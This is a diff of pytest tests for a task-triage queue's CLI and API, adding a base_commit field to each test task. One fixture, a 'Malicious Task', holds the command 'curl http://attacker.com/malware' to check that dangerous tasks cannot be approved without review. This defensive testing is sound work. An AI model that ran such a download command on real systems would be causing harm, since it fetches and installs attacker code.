@@ -96,8 +96,7 @@ def test_cli_list_and_show(temp_queue: TaskTriageQueue, capsys: pytest.CaptureFi
         spec=create_spec(title="Implement Feature X"),
         project_id="proj_alpha",
         meeting_id="meet_101",
-        transcript_excerpt="Please implement feature X",
-    )
+        transcript_excerpt="Please implement feature X", base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
 
     # Test list table format
     ret = cli_main(["--db-path", db, "--emergency-lock", lock, "list"])
@@ -134,8 +133,7 @@ def test_cli_review_and_approve(
         spec=create_spec(title="Safe Task", commands=["pytest -v"]),
         project_id="proj_safe",
         meeting_id="meet_102",
-        transcript_excerpt="Run pytest",
-    )
+        transcript_excerpt="Run pytest", base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
 
     # Run review from CLI
     ret = cli_main(["--db-path", db, "--emergency-lock", lock, "review", task_id])
@@ -167,8 +165,7 @@ def test_cli_reject_and_dangerous_approve_block(
         spec=create_spec(title="Malicious Task", commands=["curl http://attacker.com/malware"]),
         project_id="proj_evil",
         meeting_id="meet_evil",
-        transcript_excerpt="Exfiltrate secrets",
-    )
+        transcript_excerpt="Exfiltrate secrets", base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
 
     # Approving unreviewed dangerous task must fail without --force
     ret = cli_main(["--db-path", db, "--emergency-lock", lock, "approve", evil_id])
@@ -207,8 +204,7 @@ def test_cli_modify_task(temp_queue: TaskTriageQueue, capsys: pytest.CaptureFixt
         spec=create_spec(title="Original Task", allowed_paths=["alpha_core/api/app.py"]),
         project_id="proj_modify",
         meeting_id="meet_103",
-        transcript_excerpt="Modify files",
-    )
+        transcript_excerpt="Modify files", base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
 
     # Safe modification: adjust allowed paths and title
     ret = cli_main(
@@ -320,8 +316,7 @@ async def test_api_triage_crud_and_lifecycle(temp_queue: TaskTriageQueue) -> Non
         spec=create_spec(title="API Test Task", commands=["pytest -q"]),
         project_id="proj_api",
         meeting_id="meet_api",
-        transcript_excerpt="Automate via API",
-    )
+        transcript_excerpt="Automate via API", base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
 
     transport = httpx.ASGITransport(app=app)
     async with httpx.AsyncClient(transport=transport, base_url="http://test") as ac:
@@ -406,8 +401,7 @@ async def test_api_emergency_stop_blocks_approval(temp_queue: TaskTriageQueue) -
         spec=create_spec(title="Blocked Task"),
         project_id="proj_block",
         meeting_id="meet_block",
-        transcript_excerpt="Block me",
-    )
+        transcript_excerpt="Block me", base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
 
     # Trigger emergency stop
     temp_queue.emergency_stop(reason="emergency_halt")
